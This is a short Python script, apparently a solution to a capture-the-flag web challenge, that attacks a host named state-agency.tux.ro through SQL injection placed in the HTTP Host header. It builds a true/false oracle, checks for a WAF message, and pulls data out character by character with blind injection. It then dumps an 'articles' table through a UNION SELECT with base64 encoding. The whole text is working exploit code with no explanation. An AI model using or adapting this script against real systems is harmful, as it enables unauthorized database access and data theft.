import re
import requests

s = requests.session()


def oracle(condition):
    r = query("<> (%s)" % condition)
    if "WAF" in r:
        print("WAF")
    return "5889" in r


def blind(column, limit, charset):
    result = ""
    for d in range(limit):
        for c in charset:
            if oracle("select mid(%s,%d,1)=char(%d)" % (column, d, ord(c))):
                print(c)
                result += c
                break
    return result


def query(query):
    url = "http://state-agency.tux.ro"
    payload = "5880') " + query + " -- a"
    r = s.get(url, headers={"Host": payload + ".state-agency.tux.ro"})
    return r.text


def main():
    print(oracle("1=1"))
    print(oracle("1=2"))
    print(query("procedure analyse()"))
    res = query("union select 1,2,3,4,to_base64(content) from articles")
    print(re.findall("[\s\w]*==", res[9316:])[0].replace("\n", "").decode("base64"))


main()
